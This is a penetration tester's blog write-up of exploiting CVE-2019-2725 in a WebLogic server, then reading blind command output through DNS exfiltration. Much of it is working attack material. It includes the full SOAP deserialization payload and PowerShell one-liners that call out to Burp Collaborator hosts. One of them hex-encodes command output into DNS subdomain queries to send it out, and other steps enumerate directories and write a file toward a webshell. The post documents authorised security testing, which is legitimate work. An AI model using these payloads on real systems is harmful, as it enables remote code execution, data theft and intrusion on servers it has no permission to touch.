---
layout: single_c
title:  "Blind RCE and DNS Exfilteration"
date:   2020-12-27 10:43:16 +0530
toc: true
categories: Web
tags: DNS, RCE
classes: wide
---
## Description:
I was doing a security testing against a web server running `WebLogic`. A potential RCE due to CVE-2019-2725 was reported and I was verifying it.
I was following the PoC given [here](http://www.0xby.com/1589.html). 

I was getting the following page while accessing the application.

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/dns/1.1.png){: .align-center}

There were RCE available payloads for windows and linux. The following payload was used to trigger the RCE for windows.

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>cmd</string>
</void>
<void index="1">
<string>/c</string>
</void>
<void index="2">
<string>powershell "code to execute"</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```

Once the system receives the post request, it simply returns a `202` response and nothing else.

My first payloads consisted of callbacks to my burp collaborator using via TCP using `wget`, UDP using `nslookup` and ICMP using `ping`. But none of them were giving me any response. Next I tried writing to files so that I could get a webshell. But the path was difficult to ascertain. The PoC gave different paths and none of them where working for me. I came to the conclusion that the path is probably different from system to system. So it seems to be a dead end.

## DNS Requests

As I was trying out windows payloads using powershell and `wget`, I noticed that I was getting DNS hits on my burp collaborator. The hits came only once for each collaborator URL and the hit was coming from a name server that belonged to the organization I was testing. To confirm that this was indeed triggered by my payload I added a sleep before the payload to create a delay before the DNS query. 

The payload I was using was 

```powershell
powershell -exec bypass -c "sleep 60;wget 'kuiudtisadndwxklxi7g9c6rwi28qx.burpcollaborator.net'"
```

And I did get a hit exactly after 65 seconds, which confirms that the system is running on windows and we indeed have blind RCE.

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/dns/1.2.png){: .align-center}

Looking at the above picture, we can see that something is trying to resolve our request, but the actual request is getting blocked. There was also one more thing I noticed. If I try the same url again, I would not get a DNS hit as the DNS request is probably getting cached.

## DNS Exfilteration

So we have the following

1. We have RCE on a system, but there is no way to read the output.
2. The application cannot initiate communication with any system outside. So all kinds of callbacks are out of question.
3. We get DNS hits for the URL we send to the system.

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/dns/1.3.png){: .align-center}

Our application infra probably looks something like the above picture.

After some research, I came upon this awesome technique called DNS exfiltration. 

> Actually, this is not new technical, according to the Akamai, this technique is about 20 years old. In a simple definition, DNS Data exfiltration is way to exchange data between 2 computers without any directly connection, the data is exchanged through DNS protocol on intermediate DNS servers.

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/dns/1.4.png){: .align-center}

To exfiltarate data via DNS
1. Setup a domain and point the name server to one we control. This can be archived using burp collaborator or buying a domain and settings its name server to a server we control.
2. Append the data to exfilterate as a subdomain of a domain we have control over and send the request.
3. The data will be part of the DNS request we receive. 

First I will try it out using collaborator. We can append a string to the collaborator domain and make a request using `wget`

The payload will be 

```powershell
powershell -exec bypass -c "wget 'dnstest.9u4y5mpcus6j3r0wtquruty7yy4osd.burpcollaborator.net'"
```

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/dns/1.5.png){: .align-center}

Awesome. We can see that our data was indeed appended as part of the DNS request. We can use this to append the output of our command outputs as part of the subdomain and we will be able to receive the output of the command. We can also read files using this technique. 

But we have two challenges

1. **There is a length limit for the URL. This means that we cannot append huge output. The limit was around 30 characters.**  
    The solution for this is to split the command into parts and send the parts one by one using one DNS request for each part.
2. **We cannot append special characters which means we have the encode the data before appending it.**  
    My first idea was to encode the commands as base64. But this failed miserably as I realized that the DNS requests only contains lower case characters. Hence our data will be lost. The alternative is to ascii encode the characters as hex and send them over and then decode it. 
    
## Exfilterating RCE Output

After some more research, I found an a very good [script](https://gallery.technet.microsoft.com/DNS-based-data-exfiltration-fc48e292) that can do both the splitting and encoding.

I tweaked it a bit to get the output of commands that are executed. The final payload look like this

```powershell
$(whoami) -split '(.{16})' | ? {$_} | % { Resolve-DnsName (([System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($_))).Replace('-','')+'.659h81eo8n6qb5y6w9swwg71rsxulj.burpcollaborator.net') -Type A; Start-Sleep -Seconds 1 }
```

Lets break it down.

1. First it executes the command `whoami` and splits the output into lengths of 16. I tried increasing the length, but the commands where not getting split properly when I did that.
2. Iterate through each part and encode it to hex.
3. Try to Resolve the URL of collaborator with the hex data appended before it. 
4. Sleeps for 1 second and continue with the next part.

Now time to try out the payload.

```powershell
powershell -exec -c "$(whoami) -split '(.{16})' | ? {$_} | % { Resolve-DnsName (([System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($_))).Replace('-','')+'.gk4q3p8o09d9mtahnexcz8wnmes8gx.burpcollaborator.net') -Type A; Start-Sleep -Seconds 1 }"
```

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/dns/1.6.png){: .align-center}

And we get two hits with some hex data.

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/dns/1.7.png){: .align-center}

Decoding it with burp decode shows us the output. And surprisingly the application is running as  `nt authority\system` which is a dangerous thing to do.

## RCE to webshell

Using the output of our commands, we can understand the directory structure better to write a webshell.

```powershell
powershell -exec -c "$(dir) -split '(.{16})' | ? {$_} | % { Resolve-DnsName (([System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($_))).Replace('-','')+'.jtg84womt25t21z6s0t1t3xhx83zro.burpcollaborator.net') -Type A; Start-Sleep -Seconds 1 }"
```

Start with `dir` and look inside each directory. Each output will be split into multiple dns requests. We have to assemble them back together to get the output.

Finally I found that the actual path was `servers\AdminServer\tmp\_WL_internal\com.oracle.webservices.wls.bea-wls9-async-response_12.1.3\2ig01a\war\`

Our final payload will be

```powershell
powershell -exec bypass -c "echo 'file created as part of security testing' > servers\AdminServer\tmp\_WL_internal\com.oracle.webservices.wls.bea-wls9-async-response_12.1.3\2ig01a\war\sectest.txt"
```

And we can visit the page to view our payload.

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/dns/1.8.png){: .align-center}

And we can see our text. Unfortunately I do not have permission to  upload a shell. So this will be it. 

## Notes

1. As I did more research, I found a better way to send the data without using multiple requests. Data can be appended as multiple subdomains. eg `data1.data2.data3.attacker.com`. I couldn't fully get this to work
2. There are also techniques available to send data through fields other that A records.
3. Using a custom domain and a nameserver, it is possible to automate the decoding by writing a script that will listen on port 53.
4. There are tool such as [DnsSteal](https://github.com/m57/dnsteal), [requestbin.net](http://requestbin.net/) that can make the process easier.

## Further Reading
1. https://blog.fosec.vn/dns-data-exfiltration-what-is-this-and-how-to-use-2f6c69998822
2. https://blogs.infoblox.com/community/dns-data-exfiltration-how-it-works/
3. https://pentest.blog/data-exfiltration-tunneling-attacks-against-corporate-network/